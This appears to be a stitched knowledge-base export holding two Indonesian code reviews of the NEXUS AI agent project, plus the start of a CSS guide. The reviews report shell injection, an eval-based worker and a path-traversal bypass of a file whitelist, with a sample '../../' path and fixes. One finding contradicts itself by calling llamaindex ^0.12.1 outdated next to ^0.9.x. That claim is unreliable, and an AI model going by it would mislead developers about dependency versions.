# Nexus
NEXUS_MODE=learning         # learning | efficient | autonomous
```

### M7: Hapus `tests/sandboxes/vendor/` dari Repository

Direktori `tests/sandboxes/url-shortener/vendor/` berisi ratusan file PHP vendor yang tidak relevan dengan Node.js project ini dan membuat repository sangat berat. Tambahkan ke `.gitignore`:
```
tests/sandboxes/*/vendor/
tests/sandboxes/*/node_modules/
```

---

## 8. SARAN PERBAIKAN JANGKA PANJANG

### L1: Migrasi ke Framework Test Standar (Jest)

Test runner custom (`runner.js`) sulit di-maintain. Migrasi ke Jest memberikan:
- Coverage report otomatis
- Watch mode untuk TDD
- Snapshot testing
- Integrasi CI lebih mudah

```bash
npm install --save-dev jest
```

### L2: Implementasi Proper Plugin Isolation dengan `isolated-vm`

Untuk multi-tenant atau execution agent yang benar-benar aman:
```bash
npm install isolated-vm
```

Library ini memberikan V8 isolate yang benar-benar isolated (memory, CPU limit, no shared globals).

### L3: Pertimbangkan TypeScript untuk Core Modules

Mengingat kompleksitas arsitektur (20+ modul yang saling berinteraksi), TypeScript akan sangat membantu:
- Type safety untuk `EventBus` schema
- IntelliSense untuk `NexusEngine` methods
- Refactoring lebih aman

Minimal, tambahkan JSDoc untuk tipe pada fungsi-fungsi utama.

### L4: Implementasi Metrics & Observability

Saat ini metrics hanya disimpan di `this.metrics` in-memory. Untuk production:
- Eksport ke Prometheus/Grafana
- Atau minimal structured JSON metrics per cycle
- Tambahkan alert threshold (contoh: "jika MemoryGovernor trim > 50 files/jam, kirim notifikasi")

### L5: Optimasi SemanticEngine untuk Scale

Untuk knowledge base > 200 files, pertimbangkan:
- Incremental index build (hanya index file yang berubah)
- Persistent index ke disk (tidak rebuild setiap start)
- Paginated search untuk hasil banyak

### L6: Standardisasi Logging dengan Structured Log Format

Saat ini log disimpan sebagai JSON array per hari. Pertimbangkan migrasi ke structured logging library (`pino` atau `winston`) yang mendukung:
- Log rotation otomatis
- Stream ke external service (Loki, CloudWatch)
- Log level environment-based

### L7: Tambahkan Network Policy di Docker Compose

```yaml
services:
  nexus-ai:
    networks:
      - internal

  redis:
    networks:
      - internal

networks:
  internal:
    driver: bridge
    internal: true  # Blokir akses ke internet dari container
```

---

## 9. CHECKLIST TINDAKAN YANG BISA LANGSUNG DIKERJAKAN

### Hari Ini (< 1 jam)
- [ ] `git rm --cached .env && git commit -m "chore: untrack .env"` — cabut .env dari git tracking
- [ ] Rotate `APP_KEY` dan `DB_PASSWORD` yang mungkin sudah ter-expose
- [ ] `npm install` untuk generate `package-lock.json`, lalu commit
- [ ] Update `package.json` label versi: Dockerfile masih `3.1.0`, package.json `3.3.0` — sinkronkan

### Minggu Ini (< 1 hari kerja)
- [ ] Perbaiki `shell: true` → `shell: false` di `cli.js` dan `NexusEngine.js`
- [ ] Tambahkan try-catch di `initRedis()` dengan graceful degradation
- [ ] Perbaiki `SandboxExecutor.js` untuk menggunakan Worker Thread yang sudah di-import
- [ ] Tambahkan CI pipeline untuk `push`/`pull_request` di GitHub Actions
- [ ] Lengkapi `.env.example` dengan semua variable yang dibutuhkan
- [ ] Tambahkan `env_file` ke `docker-compose.yml`
- [ ] Tambahkan health check ke `docker-compose.yml`
- [ ] Pindahkan `require()` yang ada di dalam method ke top-level file

### Bulan Ini (sprint 1-2)
- [ ] Refactor `NexusEngine.js` (1317 baris) menjadi modul terpisah per phase
- [ ] Perbaiki `Logger.js` dari read-rewrite ke append mode
- [ ] Tambahkan ESLint ke project dan perbaiki semua warning
- [ ] Hapus `tests/sandboxes/vendor/` dari repository
- [ ] Tambahkan `npm run lint` ke CI pipeline
- [ ] Setup Jest sebagai test runner pengganti custom runner

---

## 10. KESIMPULAN SINGKAT

NEXUS AI adalah project dengan **ambisi arsitektur yang tinggi** dan beberapa implementasi yang genuinely solid — EventBus dengan schema registry, AgentRegistry dengan stuck detection, MemoryPipeline dengan versioned write, dan Dead Letter Queue adalah contoh engineering yang matang.

**Namun**, ada **3 area kritis** yang harus ditangani segera sebelum production deployment:

1. **Keamanan** — Shell injection via `shell: true`, `.env` yang pernah ter-track Git, dan "sandbox" yang bukan sandbox nyata membuat postur keamanan project lemah.

2. **CI/CD yang broken** — Pipeline tidak akan berjalan karena `package-lock.json` tidak ada, dan coverage development sehari-hari nol karena pipeline hanya trigger saat `release`.

3. **Technical debt pada NexusEngine.js** — File 1317 baris yang melakukan terlalu banyak hal akan menjadi bottleneck maintainability seiring project berkembang.

**Perkiraan effort perbaikan kritis:** 2-3 hari kerja untuk security fixes dan CI/CD. Refactoring NexusEngine bisa dilakukan secara bertahap dalam 1-2 sprint.

---

*Laporan ini dibuat berdasarkan review statis kode. Beberapa temuan mungkin memiliki konteks runtime yang berbeda. Tandai sebagai asumsi: (1) `package-lock.json` tidak ada — tidak terlihat dalam ZIP; (2) Redis diasumsikan optional berdasarkan code pattern.*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, saas, api]

### 📘 KNOWLEDGE: NEXUS_AI_V2_CODE_REVIEW.MD

# 🤖 NEXUS AI v3.3.0 — Laporan Code Review Komprehensif (Iterasi 2)
> **VERSION**: v1 | **Last Updated**: 26/05/2026


**Tanggal Review:** 16 Mei 2026
**Reviewer:** AI Engineering Assistant Senior
**ZIP:** `NEXUS_AI.zip` (upload terbaru)
**Klasifikasi:** Internal Engineering Report — Delta Review dari v3.3.0 (ZIP 1) ke v3.3.0 (ZIP 2)

---

## 1. RINGKASAN PROJECT

| Aspek | Detail |
|---|---|
| **Nama** | `human-ai-nexus` |
| **Versi** | `3.3.0` (main) / `3.0.0` (NEXUS_PUBLIC_DISTRIBUTION) ⚠️ |
| **Runtime** | Node.js ≥ 16, Docker: `node:22-alpine` |
| **Bahasa** | JavaScript (CommonJS) |
| **Entry Point** | `cli.js → agent/main.js → NexusEngine.js` |
| **CI/CD** | GitHub Actions: `ci.yml` (push/PR) + `npm-publish.yml` (release) |
| **Testing** | Custom TDD runner (`tests/TDD/runner.js`) |
| **Dependensi Baru** | `llamaindex ^0.12.1`, `fast-glob ^3.3.3`, `p-limit ^7.3.0` |
| **AI Backend** | Ollama (lokal) + LlamaIndex |
| **Memory** | Redis + NDJSON file-based |

### Arsitektur Folder (Versi Terbaru)
```
NEXUS AI/
├── agent/
│   ├── core/
│   │   ├── phases/          # ✅ BARU — AuditPhase, PlanningPhase, ExecutionPhase, KnowledgePhase
│   │   ├── NexusEngine.js   # ✅ Dipangkas dari 1317 → 384 baris
│   │   ├── DecisionEngine.js # ✅ BARU — AI conflict resolver
│   │   ├── EvolutionPiper.js # ✅ BARU — PBL cycle manager + guardrails
│   │   ├── Machinist.js      # ✅ BARU — Plugin forge dengan path whitelist
│   │   ├── NativeBridge.js   # ✅ BARU — C++/Python IPC bridge
│   │   ├── ParallelRunner.js # ✅ BARU — Concurrency controller
│   │   ├── ResourceMonitor.js # ✅ BARU — CPU/RAM monitoring
│   │   └── SandboxExecutor.js # ✅ DIPERBAIKI — Worker Thread nyata
│   ├── tools/               # Scanner & specialist tools
│   ├── prompts/             # Internal & external agent prompts
│   └── workflows/           # Workflow definitions per agent
├── NEXUS_PUBLIC_DISTRIBUTION/ # Versi distribusi publik
├── .github/workflows/
│   ├── ci.yml               # ✅ BARU — CI untuk push/PR
│   └── npm-publish.yml      # Pipeline release
├── .eslintrc.json            # ✅ BARU — ESLint standard config
├── package-lock.json         # ✅ BARU — Reproducible builds
├── Dockerfile                # ✅ Versi sinkron: 3.3.0
└── docker-compose.yml        # ✅ env_file + healthcheck ditambahkan
```

---

## 2. TEMUAN UTAMA

### ✅ Perbaikan Signifikan dari Versi Sebelumnya (Apresiasi)

| # | Yang Diperbaiki | Dampak |
|---|---|---|
| ✅ | `NexusEngine.js`: 1317 → 384 baris, dipecah ke `phases/` | Maintainability sangat meningkat |
| ✅ | `SandboxExecutor`: Kini menggunakan Worker Thread nyata | Security isolation terpenuhi |
| ✅ | `shell: true` → `shell: false` di cli.js dan NexusEngine | Shell injection ditutup |
| ✅ | `initRedis()` punya try-catch + graceful degradation | Crash diam-diam dicegah |
| ✅ | `Logger.js` → NDJSON append mode | Performa I/O meningkat signifikan |
| ✅ | `package-lock.json` tersedia | CI/CD `npm ci` sekarang bisa jalan |
| ✅ | `ci.yml` baru untuk push/PR trigger | Development sehari-hari terlindungi |
| ✅ | `npm run lint` ditambahkan ke `package.json` | Code quality terjaga |
| ✅ | `ESLint` + `eslint-config-standard` diinstall | Standar kode konsisten |
| ✅ | `docker-compose.yml` → `env_file` + `healthcheck` | Production-grade deployment |
| ✅ | `Dockerfile` label versi sinkron (3.3.0) | Tidak ada ambiguitas versi |
| ✅ | `config/.env.example` lengkap | Dokumentasi environment jelas |
| ✅ | `.env` tidak di-track Git | Secret exposure dicegah |
| ✅ | Port dinamis `getAvailablePort()` di `cleanCodeAndVerify()` | Konflik port dicegah |
| ✅ | `ParallelRunner` dengan `p-limit` | Concurrency terkontrol |
| ✅ | `DecisionEngine` dengan weight profiles | AI conflict resolution mature |
| ✅ | `EvolutionPiper` dengan hard guardrails (25 cycles, 2 jam) | Runaway execution dicegah |
| ✅ | `Machinist` dengan path whitelist + forbidden imports | Plugin forge lebih aman |
| ✅ | `ResourceMonitor` CPU dua-snapshot method | CPU measurement akurat |

---

### 🔴 Temuan Kritis (Masih Ada)

1. **`NEXUS_PUBLIC_DISTRIBUTION` versi tidak sinkron** — versi `3.0.0` sementara main `3.3.0`
2. **`ci.yml` Lint step tidak memblokir** — `|| echo "Lint script not yet defined"` artinya lint gagal pun CI tetap hijau
3. **`.env` masih berisi path hardcoded Windows** — `PROJECT_PATH=c:\Users\ACER\Desktop\NEXUS AI`

### 🟠 Temuan Penting

4. **`llamaindex ^0.12.1` terlalu lama** — versi terbaru adalah `^0.9.x` untuk LlamaIndex.TS, ada risiko breaking change
5. **`glob ^8.1.0` deprecated** — sudah ada `fast-glob ^3.3.3` di dependencies, tapi `glob` lama masih ada (duplikasi)
6. **`npm-publish.yml` tidak menggunakan cache npm** — lebih lambat dari `ci.yml` yang sudah pakai cache
7. **`SandboxExecutor` menggunakan `eval: true`** — Worker Thread dengan kode inline adalah vektor injection

### 🟡 Perlu Perhatian

8. **`NativeBridge.js` mengasumsikan Windows** — path `.exe` hardcoded, tidak cross-platform
9. **`ci.yml` tidak ada code coverage** — test jalan tapi tidak ada metrics coverage
10. **`NEXUS_PUBLIC_DISTRIBUTION` tidak punya `package-lock.json`** — distribusi tidak reproducible

---

## 3. REVIEW KODE

### 3.1 `NexusEngine.js` — ✅ Transformasi Luar Biasa

Dari 1317 baris menjadi **384 baris** — ini adalah perbaikan terbesar dan paling impactful. NexusEngine sekarang murni bertindak sebagai orchestrator:

```javascript
// ✅ Pola yang sangat bersih — NexusEngine hanya delegasi
async audit(targetPath = this.rootPath, options = {}) {
    return await this.auditPhase.run({ targetPath, ...options });
}
async plan(auditReport) {
    return await this.planningPhase.run(auditReport);
}
async execute(plan) {
    return await this.executionPhase.run(plan);
}
```

**Kekuatan:** Setiap phase bisa di-test dan di-maintain secara independen.

**Satu Catatan:** NexusEngine masih punya 37 `require()` di top-level yang membuat file terlihat padat di bagian atas. Pertimbangkan lazy loading untuk module yang jarang dipakai.

---

### 3.2 `SandboxExecutor.js` — ✅ Sudah Benar, Satu Catatan

Worker Thread sekarang nyata dan terpisah dari proses utama. Ini perbaikan security yang sangat signifikan.

**Catatan — `eval: true` masih berisiko:**
```javascript
const worker = new Worker(`
    const { workerData, parentPort } = require('worker_threads');
    // ... kode sebagai string
`, { eval: true, workerData: { pluginPath, args } });
```

Kode Worker sebagai string dengan `eval: true` tetap membuka vektor injection jika `pluginPath` atau `args` bisa dimanipulasi. Solusi yang lebih aman:

```javascript
// ✅ Buat file worker terpisah: agent/core/workers/plugin-worker.js
const worker = new Worker(
    path.join(__dirname, 'workers', 'plugin-worker.js'),
    { workerData: { pluginPath, args } }
);
// Hapus eval: true sama sekali
```

---

### 3.3 `DecisionEngine.js` — ✅ Solid

Weight profiles per context (`saas`, `security`, `performance`, `refactor`, dll.) adalah pattern yang sangat matang untuk AI decision making. Fallback ke `default` profile dengan warning yang jelas juga baik.

**Satu Peningkatan:** Tambahkan validasi bahwa semua `opt.scores` memiliki semua kriteria yang dibutuhkan:

```javascript
// ✅ Tambahkan validasi scores
const ranked = options.map(opt => {
    let totalScore = 0;
    for (const criteria in weights) {
        const score = opt.scores?.[criteria];
        if (score === undefined) {
            console.warn(`⚠️ DecisionEngine: option "${opt.id}" missing score for "${criteria}". Defaulting to 0.`);
        }
        totalScore += (score || 0) * weights[criteria];
    }
    return { ...opt, final_score: parseFloat(totalScore.toFixed(4)), context_used: context };
});
```

---

### 3.4 `EvolutionPiper.js` — ✅ Guardrails yang Baik

Hard limit 25 cycles dan 120 menit adalah keputusan engineering yang tepat untuk mencegah infinite loop dan resource exhaustion.

**Satu Masalah:** `currentCycle` disimpan di memori instance — jika process crash dan restart, counter reset ke 0. Untuk true safety boundary, counter harus persisted:

```javascript
// ✅ Persist ke file
async checkEvolutionBoundary() {
    const stateFile = path.join(this.rootPath, 'memory/operational/evolution_state.json');
    let state = { currentCycle: 0, sessionStart: Date.now() };
    
    try {
        if (await fs.pathExists(stateFile)) {
            state = await fs.readJson(stateFile);
        }
    } catch (_) {}

    if (state.currentCycle >= this.MAX_EVOLUTION_CYCLES) {
        throw new Error(`🚧 EVOLUTION BOUNDARY: Max ${this.MAX_EVOLUTION_CYCLES} cycles reached.`);
    }
    
    state.currentCycle++;
    await fs.writeJson(stateFile, state);
}
```

---

### 3.5 `Machinist.js` — ✅ Security Guardrails Baik

Path whitelist + blacklist + forbidden import check adalah layer defense yang solid. `FORGE_FORBIDDEN_PATHS` mencakup semua area kritikal.

**Satu Celah:** Validasi hanya cek `startsWith` — path traversal seperti `agent/tools/scanners/../../core/NexusEngine.js` bisa lolos:

```javascript
// ❌ Celah path traversal
const normalizedPath = outputPath.replace(/\\/g, '/');
const isAllowed = FORGE_ALLOWED_PATHS.some(p => normalizedPath.startsWith(p));

// ✅ Perbaikan — resolve dan normalize dulu
const resolvedPath = path.resolve(this.rootPath, outputPath);
const normalizedRelative = path.relative(this.rootPath, resolvedPath).replace(/\\/g, '/');
// Lanjutkan validasi dengan normalizedRelative
```

---

### 3.6 `NativeBridge.js` — Platform-Specific tanpa Guard

```javascript
// ❌ Hardcoded .exe — hanya Windows
const fullPath = path.join(this.binPath, 
    binaryName.endsWith('.exe') ? binaryName : `${binaryName}.exe`
);
```

Ini akan gagal di Linux (Docker container yang pakai `node:22-alpine`).

```javascript
// ✅ Cross-platform
const isWindows = process.platform === 'win32';
const binaryFile = isWindows 
    ? (binaryName.endsWith('.exe') ? binaryName : `${binaryName}.exe`)
    : binaryName;
const fullPath = path.join(this.binPath, binaryFile);
```

---

### 3.7 `ResourceMonitor.js` — ✅ Excellent

Two-snapshot CPU measurement adalah implementasi yang benar dan jarang dilihat di project Node.js. Fix dari "CPU always 0%" dengan delta method menunjukkan debugging mendalam.

---

### 3.8 `Logger.js` — ✅ NDJSON Append Mode

Perbaikan dari read-rewrite ke append mode sudah benar. Sekarang performa I/O jauh lebih baik.

**Tambahan kecil:** Queue-based write (`_writeQueue`) sudah ada di constructor tapi tidak digunakan dalam implementasi `log()`. Jika konkurensi tinggi, ini bisa menyebabkan file corruption:

```javascript
// ✅ Gunakan queue yang sudah disiapkan
async log(category, level, ...) {
    // ...
    this._writeQueue = this._writeQueue.then(() =>
        fs.appendFile(logFile, JSON.stringify(logEntry) + '\n')
    );
    return this._writeQueue;
}
```

---

### 3.9 `ParallelRunner.js` — ✅ Solid dan Ringkas

21 baris yang melakukan satu hal dengan baik. `p-limit` adalah library yang tepat untuk ini.

---

## 4. REVIEW PIPELINE

### 4.1 `ci.yml` — ✅ Jauh Lebih Baik, Satu Bug Kritis

```yaml
- name: Run Lint
  run: npm run lint || echo "Lint script not yet defined"  # ❌ BUG
```

`|| echo` ini artinya: **jika lint gagal, CI tetap hijau**. Ini mengalahkan seluruh tujuan lint di CI.

```yaml
# ✅ Perbaikan — hapus fallback echo
- name: Run Lint
  run: npm run lint
```

Karena `npm run lint` sudah didefinisikan di `package.json`, fallback tidak diperlukan lagi.

### 4.2 `npm-publish.yml` — Perlu Update Minor

```yaml
# ❌ Tidak ada cache npm (berbeda dengan ci.yml yang sudah pakai cache)
- uses: actions/setup-node@v4
  with:
    node-version: 20
    # cache: 'npm' ← hilang

# ❌ Duplikasi — npm ci dijalankan 2x (build + publish-npm)
```

Saran: Gunakan artifact sharing antar job, atau gabungkan menjadi satu job dengan conditional publish.

### 4.3 Docker — ✅ Sudah Production-Grade

`env_file`, `healthcheck`, `restart: unless-stopped`, dan volume mounting sudah benar. Dockerfile juga sudah menggunakan `COPY package*.json ./` sebelum `COPY . .` untuk layer caching yang efisien.

**Satu Tambahan:** Tambahkan network isolation:

```yaml
# ✅ Tambahkan ke docker-compose.yml
networks:
  nexus-internal:
    driver: bridge

services:
  nexus-ai:
    networks:
      - nexus-internal
```

---

## 5. SECURITY & PERFORMANCE CHECK

### Security

| # | Severity | Lokasi | Status | Deskripsi |
|---|---|---|---|---|
| S1 | 🔴 CRITICAL | `SandboxExecutor.js` | ⚠️ Partial | `eval: true` pada Worker — perlu file worker terpisah |
| S2 | 🔴 CRITICAL | `Machinist.js` | ⚠️ Partial | Path traversal `../../` bisa bypass whitelist |
| S3 | 🟠 HIGH | `.env` | ⚠️ Remaining | Path Windows hardcoded masih ada |
| S4 | 🟠 HIGH | `ci.yml` | ⚠️ Bug | Lint failure tidak memblokir CI |
| S5 | 🟡 MEDIUM | `NativeBridge.js` | ❌ Baru | `.exe` hardcoded, gagal di Linux/Docker |
| S6 | 🟡 MEDIUM | `NEXUS_PUBLIC_DIST` | ❌ Baru | Versi 3.0.0 tapi kode mungkin sudah 3.3.0 |

### Performance

| # | Severity | Lokasi | Status | Deskripsi |
|---|---|---|---|---|
| P1 | ✅ FIXED | `Logger.js` | Resolved | NDJSON append — tidak ada lagi read-rewrite |
| P2 | ✅ FIXED | `cleanCodeAndVerify()` | Resolved | Port dinamis, `shell: false` |
| P3 | ✅ NEW | `ParallelRunner.js` | Resolved | `p-limit` untuk concurrency control |
| P4 | 🟡 MEDIUM | `NexusEngine.js` | Remaining | 37 `require()` di top-level — pertimbangkan lazy load |
| P5 | 🟡 MEDIUM | `SemanticEngine.js` | Remaining | `buildIndex()` masih load semua file ke RAM |
| P6 | 🟡 LOW | `glob ^8.1.0` | Duplikasi | `fast-glob` sudah ada — hapus `glob` lama |

---

## 6. SARAN PERBAIKAN PRIORITAS TINGGI

### P1: Perbaiki CI Lint — Hapus `|| echo`

**File:** `.github/workflows/ci.yml`

```yaml
# SEBELUM (❌ — lint failure tidak terdeteksi)
run: npm run lint || echo "Lint script not yet defined"

# SESUDAH (✅)
- name: Run Lint
  run: npm run lint
```

**Estimasi:** 2 menit.

---

### P2: Perbaiki Path Traversal di `Machinist.js`

**File:** `agent/core/Machinist.js`

```javascript
// SEBELUM (❌)
_validateForgePath(outputPath) {
    const normalizedPath = outputPath.replace(/\\/g, '/');
    const isAllowed = FORGE_ALLOWED_PATHS.some(p => normalizedPath.startsWith(p));

// SESUDAH (✅)
_validateForgePath(outputPath) {
    // Resolve absolute path dulu untuk mencegah ../../ traversal
    const absoluteResolved = path.resolve(this.rootPath, outputPath);
    const normalizedPath = path.relative(this.rootPath, absoluteResolved)
                               .replace(/\\/g, '/');

    // Pastikan tidak keluar dari rootPath
    if (normalizedPath.startsWith('..')) {
        throw new Error(`Machinist: Path traversal detected: ${outputPath}`);
    }

    const isAllowed = FORGE_ALLOWED_PATHS.some(p => normalizedPath.startsWith(p));
    const isForbidden = FORGE_FORBIDDEN_PATHS.some(p => normalizedPath.startsWith(p));
    // ... sisa logika sama
}
```

---

### P3: Ganti Worker `eval: true` dengan File Terpisah

**File:** `agent/core/SandboxExecutor.js` + buat file baru

Buat file baru: `agent/core/workers/plugin-worker.js`:
```javascript
const { workerData, parentPort } = require('worker_threads');

async function run() {
    try {
        const plugin = require(workerData.pluginPath);
        const action = plugin.scan || plugin.execute;
        if (typeof action !== 'function') {
            throw new Error('Plugin must export a scan() or execute() function.');
        }
        const result = await Promise.resolve(action(workerData.args));
        parentPort.postMessage({ ok: true, result });
    } catch (err) {
        parentPort.postMessage({ ok: false, error: err.message });
    }
}
run();
```

Lalu di `SandboxExecutor.js`:
```javascript
// SEBELUM (❌ — eval: true)
const worker = new Worker(`...kode inline...`, { eval: true, workerData: { pluginPath, args } });

// SESUDAH (✅)
const workerPath = path.join(__dirname, 'workers', 'plugin-worker.js');
const worker = new Worker(workerPath, { workerData: { pluginPath, args } });
```

---

### P4: Perbaiki `NativeBridge.js` untuk Cross-Platform

```javascript
// SEBELUM (❌)
const fullPath = path.join(this.binPath, binaryName.endsWith('.exe') ? binaryName : `${binaryName}.exe`);

// SESUDAH (✅)
const isWindows = process.platform === 'win32';
const binaryFile = isWindows 
    ? (binaryName.endsWith('.exe') ? binaryName : `${binaryName}.exe`)
    : binaryName;
const fullPath = path.join(this.binPath, binaryFile);
```

---

### P5: Sinkronkan Versi `NEXUS_PUBLIC_DISTRIBUTION`

```bash
# Update package.json di NEXUS_PUBLIC_DISTRIBUTION
# Ganti "version": "3.0.0" → "version": "3.3.0"
```

Dan tambahkan script untuk auto-sync versi di `package.json` root:
```json
"scripts": {
    "sync-version": "node -e \"const p=require('./package.json'); const pp=require('./NEXUS_PUBLIC_DISTRIBUTION/package.json'); pp.version=p.version; require('fs').writeFileSync('./NEXUS_PUBLIC_DISTRIBUTION/package.json', JSON.stringify(pp,null,2))\""
}
```

---

## 7. SARAN PERBAIKAN PRIORITAS MENENGAH

### M1: Persist `EvolutionPiper` State ke File

Agar hard limit 25 cycles benar-benar tidak bisa di-bypass dengan restart:

```javascript
// Simpan state ke: memory/operational/evolution_state.json
async checkEvolutionBoundary() {
    const stateFile = path.join(this.rootPath, 'memory/operational/evolution_state.json');
    let state = { currentCycle: 0, sessionStart: Date.now() };
    try {
        if (await fs.pathExists(stateFile)) state = await fs.readJson(stateFile);
    } catch (_) {}
    
    if (state.currentCycle >= this.MAX_EVOLUTION_CYCLES) {
        throw new Error(`🚧 BOUNDARY: Max ${this.MAX_EVOLUTION_CYCLES} cycles. Run 'nexus distill' first.`);
    }
    
    state.currentCycle++;
    await fs.writeJson(stateFile, state);
    this.currentCycle = state.currentCycle;
}
```

### M2: Gunakan Logger Queue untuk Concurrent Write Safety

```javascript
async log(category, level, agent, task_id, event, message, duration_ms = 0, metadata = {}, trace_id = 'N/A') {
    // ...validasi...
    this._writeQueue = this._writeQueue.then(async () => {
        try {
            await fs.ensureDir(logDir);
            await fs.appendFile(logFile, JSON.stringify(logEntry) + '\n');
        } catch (e) {
            console.error(`Logger Failed: ${e.message}`);
        }
    });
    return this._writeQueue;
}
```

### M3: Hapus `glob ^8.1.0` — Gunakan `fast-glob` Saja

Kedua library ada sekarang, tapi `glob ^8.1.0` deprecated dan `fast-glob` jauh lebih cepat:

```bash
npm uninstall glob
```

Lalu ganti semua `require('glob')` dengan `require('fast-glob')` di seluruh codebase:
```bash
grep -rn "require('glob')" agent/ tests/ --include="*.js"
```

### M4: Tambahkan npm Cache ke `npm-publish.yml`

```yaml
- uses: actions/setup-node@v4
  with:
    node-version: 20
    cache: 'npm'              # ← Tambahkan ini
    registry-url: https://registry.npmjs.org/
```

### M5: Tambahkan Network Isolation ke `docker-compose.yml`

```yaml
networks:
  nexus-internal:
    driver: bridge

services:
  nexus-ai:
    networks:
      - nexus-internal
  redis:
    networks:
      - nexus-internal
```

### M6: Tambahkan DecisionEngine Score Validation

```javascript
// Di DecisionEngine.resolve()
const ranked = options.map(opt => {
    let totalScore = 0;
    for (const criteria in weights) {
        if (opt.scores?.[criteria] === undefined) {
            console.warn(`⚠️ DecisionEngine: "${opt.id}" missing score for "${criteria}"`);
        }
        totalScore += (opt.scores?.[criteria] || 0) * weights[criteria];
    }
    return { ...opt, final_score: parseFloat(totalScore.toFixed(4)) };
});
```

---

## 8. SARAN PERBAIKAN JANGKA PANJANG

### L1: Migrasi Test ke Jest

Custom runner masih dipakai. Jest akan memberikan:
- Coverage report otomatis
- Watch mode untuk TDD
- Snapshot testing
- Integrasi CI lebih baik

```bash
npm install --save-dev jest
```

Tambah ke `ci.yml`:
```yaml
- name: Run Tests with Coverage
  run: npx jest --coverage
```

### L2: Upgrade `llamaindex` ke Versi Stabil Terbaru

`llamaindex ^0.12.1` perlu diverifikasi kompatibilitasnya dengan Node.js 22:
```bash
npm outdated llamaindex
npm install llamaindex@latest
```

### L3: Implementasi API Rate Limiting di `LocalIntelligence`

Jika Ollama diakses paralel oleh banyak agent sekaligus via `ParallelRunner`, bisa terjadi request flood. Tambahkan rate limiter di `LocalIntelligence`:

```javascript
const pLimit = require('p-limit');
const ollamaLimit = pLimit(2); // Max 2 concurrent Ollama requests

async generate(prompt, tag) {
    return ollamaLimit(() => this._doGenerate(prompt, tag));
}
```

### L4: Tambahkan `NEXUS_PUBLIC_DISTRIBUTION` ke CI

Distribusi publik juga perlu ditest:
```yaml
- name: Test Public Distribution
  run: cd NEXUS_PUBLIC_DISTRIBUTION && npm ci && npm test
```

### L5: Implementasi OpenTelemetry untuk Distributed Tracing

`currentCorrelationId` sudah ada — ini adalah fondasi yang baik. Langkah selanjutnya: integrasikan dengan OpenTelemetry untuk tracing yang bisa divisualisasi di Grafana/Jaeger.

### L6: Buat `package-lock.json` untuk `NEXUS_PUBLIC_DISTRIBUTION`

```bash
cd NEXUS_PUBLIC_DISTRIBUTION
npm install
git add package-lock.json
```

---

## 9. CHECKLIST TINDAKAN YANG BISA LANGSUNG DIKERJAKAN

### ⚡ Hari Ini (< 30 menit total)

- [ ] **Hapus `|| echo`** di `ci.yml` baris 28 — 2 menit
- [ ] **Sinkronkan versi** `NEXUS_PUBLIC_DISTRIBUTION/package.json` dari `3.0.0` → `3.3.0` — 1 menit
- [ ] **Bersihkan `.env`** — ubah `PROJECT_PATH=c:\Users\ACER\Desktop\NEXUS AI` → `PROJECT_PATH=./` — 1 menit
- [ ] **Hapus `glob ^8.1.0`** dari `package.json` karena sudah ada `fast-glob` — 5 menit
- [ ] **Tambah `cache: 'npm'`** di `npm-publish.yml` — 1 menit

### 🔧 Sprint Ini (< 1 hari kerja)

- [ ] **Buat `agent/core/workers/plugin-worker.js`** dan hapus `eval: true` dari SandboxExecutor
- [ ] **Perbaiki path traversal** di `Machinist._validateForgePath()`
- [ ] **Perbaiki `NativeBridge.js`** untuk cross-platform (hapus `.exe` hardcoded)
- [ ] **Implementasi Logger queue** untuk concurrent write safety
- [ ] **Tambahkan network isolation** di `docker-compose.yml`
- [ ] **Tambahkan npm cache** di `npm-publish.yml`

### 📅 Sprint Berikutnya

- [ ] **Persist `EvolutionPiper` state** ke `memory/operational/evolution_state.json`
- [ ] **Tambahkan DecisionEngine score validation**
- [ ] **Buat `package-lock.json`** untuk `NEXUS_PUBLIC_DISTRIBUTION`
- [ ] **Verifikasi `llamaindex ^0.12.1`** kompatibilitas dengan Node.js 22
- [ ] **Migrasi ke Jest** sebagai test framework

---

## 10. KESIMPULAN SINGKAT

**Versi ini adalah lompatan besar.** Hampir semua temuan kritis dari review pertama sudah diselesaikan:

| Area | v3.3.0 (ZIP 1) | v3.3.0 (ZIP 2) |
|---|---|---|
| Shell Injection | 🔴 Ada | ✅ Diperbaiki |
| .env di Git | 🔴 Ada | ✅ Diperbaiki |
| SandboxExecutor | 🔴 Bukan sandbox | ✅ Worker Thread nyata |
| NexusEngine size | 🔴 1317 baris | ✅ 384 baris + phases |
| Logger I/O | 🟠 Read-rewrite | ✅ NDJSON append |
| CI/CD | 🟠 Hanya release | ✅ Push/PR + lint |
| package-lock.json | 🔴 Tidak ada | ✅ Ada |
| Graceful Redis | 🔴 Crash diam-diam | ✅ Graceful degradation |
| Port hardcoded | 🟠 8001 selalu | ✅ Dinamis |
| docker-compose | 🟠 Minimal | ✅ env_file + healthcheck |

**Sisa pekerjaan** adalah refinement dan hardening — bukan perbaikan fundamental. Project ini sudah dalam kondisi yang layak untuk production testing. Tiga hal yang paling penting untuk dikerjakan berikutnya, berurutan:

1. Fix `|| echo` di `ci.yml` — karena ini membuat seluruh CI security theater
2. Fix path traversal di `Machinist` — karena ini adalah celah keamanan nyata
3. Ganti `eval: true` di SandboxExecutor — untuk menutup vektor injection terakhir

---

*Review ini berbasis analisis statis kode. Asumsi: `tests/TDD/runner.js` dan `sandbox-master-runner.js` tidak berubah signifikan dari versi sebelumnya (belum di-extract untuk diverifikasi).*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, ui-ux, performance, tdd, vcs, saas, api]

### 📘 KNOWLEDGE: NEXUS_CSS.MD

# CSS: Modern Architecture and Performance
> **VERSION**: v1 | **Last Updated**: 26/05/2026



These guidelines provide a high-density reference for writing maintainable, performant, and standard-compliant CSS.

1. [1. Foundations](#1-foundations)
2. [2. Inheritance and The Cascade](#2-inheritance-and-the-cascade)
3. [3. Selectors and scoping](#3-selectors-and-scoping)
   1. [Prefer CSS selectors over JS for complex element targeting](#prefer-css-selectors-over-js-for-complex-element-targeting)
   2. [Use `:is()` (or `:where()`) instead of CSS rule duplication for fallbacks](#use-is-or-where-instead-of-css-rule-duplication-for-fallbacks)
   3. [Avoid overmatching](#avoid-overmatching)
   4. [Nesting and scoping](#nesting-and-scoping)
4. [4. Interactivity](#4-interactivity)
   1. [Focus management](#focus-management)
   2. [Touch targets](#touch-targets)
5. [5. Design Tokens and Theming](#5-design-tokens-and-theming)
   1. [Dark mode](#dark-mode)
   2. [Forced Colors Mode](#forced-colors-mode)
   3. [Generating tints](#generating-tints)
